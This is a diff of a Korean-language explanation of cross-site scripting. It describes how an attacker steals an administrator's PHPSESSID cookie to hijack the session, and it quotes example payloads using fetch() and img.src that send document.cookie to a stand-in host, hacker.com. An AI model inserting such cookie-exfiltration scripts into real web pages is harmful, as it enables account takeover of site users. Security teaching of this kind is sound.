@@ -157,6 +157,7 @@ or img.src = 'htttp://ww.hacker.com/log.php?data=' + document.cookie);<br>
 
 관리자가 로그인 하면 PHPSESSID가 나오는데, 공격자가 요구한 쿠키값으로 관리자 로그인 증명서와 같습니다.<br>
 공격자는<br>
+<br>
 fetch('htttp://ww.hacker.com/steal?cookie=' + document.cookie); 또는,<br>
 img.src = "htttp//ww.hacker.com/log.php?data=" + document.cookie); 처럼,<br>
 공격자의 서버로 보내는 스크립트를 구성해 관리자로 로그인하는 세션 하이재킹을 악용할 수 있습니다.
